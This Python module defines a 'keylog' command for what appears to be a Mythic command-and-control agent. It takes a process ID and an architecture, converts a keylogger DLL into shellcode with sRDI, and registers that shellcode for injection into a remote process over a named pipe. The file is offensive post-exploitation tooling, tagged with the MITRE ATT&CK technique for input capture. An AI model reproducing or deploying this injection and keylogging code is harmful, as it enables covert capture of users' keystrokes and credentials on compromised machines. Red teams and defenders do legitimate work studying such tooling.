from CommandBase import *
import json
from uuid import uuid4
from os import path
from sRDI import ShellcodeRDI
from MythicFileRPC import *


class KeylogArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject keylogger into."),
            "arch": CommandParameter(name="Process Architecture", type=ParameterType.String, choices=["x86", "x64"], description="Architecture of the remote process."),
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Invalid number of parameters passed.\n\tUsage: {}".format(KeylogCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            valid_arch = ["x86", "x64"]
            parts = self.command_line.split()
            if len(parts) != 2:
                raise Exception("Invalid number of parameters passed.\n\tUsage: {}".format(KeylogCommand.help_cmd))
            try:
                if int(parts[0]) % 4 != 0:
                    raise Exception("")
            except:
                raise Exception("Invalid PID given: {}".format(parts[0]))
            if parts[1] not in valid_arch:
                raise Exception("Invalid architecture given: {}. Must be one of {}".format(parts[1], ", ".join(valid_arch)))
            self.add_arg("pid", int(parts[0]), ParameterType.Number)
            self.add_arg("arch", parts[1])


class KeylogCommand(CommandBase):
    cmd = "keylog"
    needs_admin = False
    help_cmd = "keylog [pid] [x64|x86]"
    description = "Start a keylogger in a remote process."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = KeylogArguments
    attackmapping = ["T1056"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.args.add_arg("pipe_name", str(uuid4()))
        dllPath = path.join(self.agent_code_path, "Keylog_{}.dll".format(task.args.get_arg("arch")))
        dllBytes = open(dllPath, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicFileRPC(task).register_file(converted_dll)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("file_id", file_resp.agent_file_id)
        else:
            raise Exception("Failed to register keylogger DLL: " + file_resp.error_message)
        task.args.remove_arg("arch")
        
        return task

    async def process_response(self, response: AgentResponse):
        pass